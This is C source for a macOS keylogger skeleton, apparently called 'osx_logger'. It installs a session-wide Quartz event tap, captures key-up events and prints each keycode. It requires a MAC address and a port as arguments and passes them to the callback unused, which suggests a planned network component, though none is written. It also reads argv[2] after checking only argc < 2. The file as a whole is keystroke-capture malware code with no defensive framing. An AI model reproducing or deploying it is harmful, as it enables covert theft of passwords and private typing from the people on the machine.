#include <ApplicationServices/ApplicationServices.h>

struct Config {
	char *mac;
	char *port;
	// int port;
};

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type,
                  					 CGEventRef event, void *refcon) {
	
		// get our config
		struct Config *cfg = refcon;

    // Paranoid sanity check.
    if ((type != kCGEventKeyDown) && (type != kCGEventKeyUp))
        return event;

    // The incoming keycode.
    CGKeyCode keycode = (CGKeyCode)CGEventGetIntegerValueField(
                                       event, kCGKeyboardEventKeycode);

    //Keypress code goes here.
    fprintf(stdout,"press keycode: %d\n", keycode);

    // We must return the event for it to be useful.
    return event;
}

int main(int argc, char *argv[]) {
    CFMachPortRef      eventTap;
    CGEventMask        eventMask;
    CFRunLoopSourceRef runLoopSource;


		// print the MAC address input param if we have it
		if (argc < 2) {
			printf("You must supply the MAC address and Port as a param: \"./osx_logger 12:34:56:78 1337\n\"");
			exit(1);
		}

		// store our config settings
		struct Config c, *cfg = &c;
		c.mac = argv[1];
		c.port = argv[2];
		printf("mac: %s\tport: %s\n\n", cfg->mac, cfg->port);

    // Create an event tap. We are interested in key presses.
    eventMask = ((1 << kCGEventKeyUp));
    eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0,
                                eventMask, myCGEventCallback, cfg);
    if (!eventTap) {
        fprintf(stderr, "failed to create event tap\n");
        exit(1);
    }   

    // Create a run loop source.
    runLoopSource = CFMachPortCreateRunLoopSource(
                        kCFAllocatorDefault, eventTap, 0);

    // Add to the current run loop.
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource,
                       kCFRunLoopCommonModes);

    // Enable the event tap.
    CGEventTapEnable(eventTap, true);

    // Set it all running.
    CFRunLoopRun();

    exit(0);
}